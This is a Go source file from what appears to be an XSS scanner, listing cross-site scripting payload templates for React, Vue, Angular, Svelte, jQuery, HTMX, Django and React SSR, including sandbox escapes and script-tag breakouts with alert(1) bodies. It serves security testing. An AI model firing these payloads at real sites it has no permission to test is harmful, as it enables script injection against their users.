package payload

import (
	"strings"

	"github.com/xsscan/xsscan/pkg/context"
	"github.com/xsscan/xsscan/pkg/model"
)

// frameworkPayloadCache pre-builds framework template lists once at init to
// avoid per-injection-point slice allocation. READ-ONLY contract.
var frameworkPayloadCache = map[string][]PayloadTemplate{}

func init() {
	frameworkPayloadCache["react"] = reactPayloads()
	frameworkPayloadCache["vue"] = vuePayloads()
	frameworkPayloadCache["vue.js"] = frameworkPayloadCache["vue"]
	frameworkPayloadCache["angular"] = angularPayloads()
	frameworkPayloadCache["svelte"] = sveltePayloads()
	frameworkPayloadCache["jquery"] = jqueryPayloads()
	frameworkPayloadCache["htmx"] = htmxPayloads()
	frameworkPayloadCache["django"] = djangoPayloads()
	frameworkPayloadCache["flask"] = jinjaPayloads()
	frameworkPayloadCache["jinja2"] = frameworkPayloadCache["flask"]
}

// FrameworkPayloads returns payloads specific to a detected framework.
// These target known XSS vectors in popular JavaScript frameworks.
// Returns the cached list (read-only).
func FrameworkPayloads(framework string) []PayloadTemplate {
	return frameworkPayloadCache[strings.ToLower(framework)]
}

func reactPayloads() []PayloadTemplate {
	return []PayloadTemplate{
		{
			Value:    `{"__html":"<img src=x onerror=alert(1)>"}`,
			Context:  context.ContextJSONValue,
			Severity: model.Critical,
			Desc:     "React: dangerouslySetInnerHTML via JSON injection",
		},
		{
			Value:    `<div dangerouslySetInnerHTML={{__html:"<img src=x onerror=alert(1)>"}}></div>`,
			Context:  context.ContextHTMLBody,
			Severity: model.Critical,
			Desc:     "React: dangerouslySetInnerHTML attribute",
		},
	}
}

func vuePayloads() []PayloadTemplate {
	return []PayloadTemplate{
		{
			Value:    `{{constructor.constructor('alert(1)')()}}`,
			Context:  context.ContextTemplate,
			Severity: model.Critical,
			Desc:     "Vue 2: template sandbox escape via constructor chain",
		},
		{
			Value:    `{{_openBlock.constructor('alert(1)')()}}`,
			Context:  context.ContextTemplate,
			Severity: model.Critical,
			Desc:     "Vue 3: template sandbox escape via _openBlock",
		},
		{
			Value:    `<div v-html="<img src=x onerror=alert(1)>"></div>`,
			Context:  context.ContextHTMLBody,
			Severity: model.High,
			Desc:     "Vue: v-html directive injection",
		},
	}
}

func angularPayloads() []PayloadTemplate {
	return []PayloadTemplate{
		// AngularJS 1.x sandbox escape via toString constructor chain
		{
			Value:    `{{'a]'.constructor.prototype.charAt=[].join;$eval('x]alert(1)')}}`,
			Context:  context.ContextTemplate,
			Severity: model.Critical,
			Desc:     "AngularJS 1.x: sandbox escape via charAt prototype pollution",
		},
		{
			Value:    `{{constructor.constructor('alert(1)')()}}`,
			Context:  context.ContextTemplate,
			Severity: model.High,
			Desc:     "AngularJS: constructor chain escape",
		},
		// AngularJS 1.x — $eval via toString/call prototype chain
		{
			Value:    `{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["alert(1)"].forEach(alert)}}`,
			Context:  context.ContextTemplate,
			Severity: model.Critical,
			Desc:     "AngularJS 1.x: toString/call prototype chain",
		},
		// Angular 2+ template injection via structural directives
		{
			Value:    `<div *ngIf="constructor.constructor('alert(1)')()">XSS</div>`,
			Context:  context.ContextHTMLBody,
			Severity: model.High,
			Desc:     "Angular 2+: template injection via *ngIf",
		},
		{
			Value:    `<ng-template *ngFor="let x of [constructor.constructor('alert(1)')()]"></ng-template>`,
			Context:  context.ContextHTMLBody,
			Severity: model.High,
			Desc:     "Angular 2+: template injection via *ngFor",
		},
		// AngularJS 1.x — charAt join escape (variant without bracket trick)
		{
			Value:    `{{'a'.constructor.prototype.charAt=[].join;$eval('x.alert(1)')}}`,
			Context:  context.ContextTemplate,
			Severity: model.High,
			Desc:     "AngularJS 1.x: charAt join escape (variant)",
		},
		// AngularJS — object literal breakout attempt
		{
			Value:    `{{{}.")));alert(1)//"}}`,
			Context:  context.ContextTemplate,
			Severity: model.Medium,
			Desc:     "AngularJS: object literal breakout attempt",
		},
	}
}

func sveltePayloads() []PayloadTemplate {
	return []PayloadTemplate{
		{
			Value:    `<svelte:window on:keydown={alert(1)} />`,
			Context:  context.ContextHTMLBody,
			Severity: model.High,
			Desc:     "Svelte: window event handler injection",
		},
		{
			Value:    `<img src=x on:error={alert(1)}>`,
			Context:  context.ContextHTMLBody,
			Severity: model.High,
			Desc:     "Svelte: on:error event handler",
		},
	}
}

func jqueryPayloads() []PayloadTemplate {
	return []PayloadTemplate{
		{
			Value:    `<img src=x onerror=$.globalEval('alert(1)')>`,
			Context:  context.ContextHTMLBody,
			Severity: model.High,
			Desc:     "jQuery: globalEval via param pollution",
		},
		{
			Value:    `$.parseJSON('{"__proto__":{"polluted":"<img src=x onerror=alert(1)>"}}')`,
			Context:  context.ContextJSBlock,
			Severity: model.Medium,
			Desc:     "jQuery: prototype pollution via parseJSON",
		},
	}
}

func htmxPayloads() []PayloadTemplate {
	return []PayloadTemplate{
		{
			Value:    `<div hx-on:click="alert(1)" hx-get="/x">click</div>`,
			Context:  context.ContextHTMLBody,
			Severity: model.High,
			Desc:     "HTMX: hx-on event handler injection",
		},
		{
			Value:    `<div hx-trigger="click" hx-get="javascript:alert(1)">load</div>`,
			Context:  context.ContextHTMLBody,
			Severity: model.High,
			Desc:     "HTMX: javascript: protocol in hx-get",
		},
	}
}

func djangoPayloads() []PayloadTemplate {
	return []PayloadTemplate{
		{
			Value:    `{{request.GET.q|safe}}`,
			Context:  context.ContextTemplate,
			Severity: model.High,
			Desc:     "Django: safe filter bypass (if controllable)",
		},
	}
}

func jinjaPayloads() []PayloadTemplate {
	// Jinja2 SSTI→RCE payloads removed — these are server-side template injection,
	// not XSS, and would generate false positives in an XSS scanner.
	return nil
}

// Vue2SandboxPayloads are Vue 2.x-specific sandbox escape payloads.
// Vue 3 REMOVED the template sandbox — these do not work there.
func Vue2SandboxPayloads() []PayloadTemplate {
	return []PayloadTemplate{
		{
			Value:    `{{_c.constructor('alert(1)')()}}`,
			Context:  context.ContextTemplate,
			Severity: model.Critical,
			Desc:     "Vue 2 sandbox escape via _c.constructor",
		},
		{
			Value:    `{{constructor.constructor('alert(1)')()}}`,
			Context:  context.ContextTemplate,
			Severity: model.Critical,
			Desc:     "Vue 2 sandbox escape via constructor chain",
		},
		{
			Value:    `{{$root.constructor('alert(1)')()}}`,
			Context:  context.ContextTemplate,
			Severity: model.High,
			Desc:     "Vue 2 sandbox escape via $root",
		},
	}
}

// ReactSSRPayloads are React SSR-specific injection payloads: breaking out
// of embedded JSON state scripts (<script>window.__data=...user input...</script>)
// and dangerouslySetInnerHTML hydration.
func ReactSSRPayloads() []PayloadTemplate {
	return []PayloadTemplate{
		{
			Value:    `</script><script>alert(1)</script>`,
			Context:  context.ContextHTMLBody,
			Severity: model.Critical,
			Desc:     "React SSR JSON state breakout (__NEXT_DATA__/window.__data)",
		},
		{
			Value:    `"}});</script><script>alert(1)</script>//`,
			Context:  context.ContextHTMLBody,
			Severity: model.Critical,
			Desc:     "React SSR serialized props breakout",
		},
		{
			Value:    `"><img src=x onerror=alert(1)>`,
			Context:  context.ContextHTMLAttrValue,
			Severity: model.High,
			Desc:     "React SSR attribute injection (unescaped attr)",
		},
	}
}
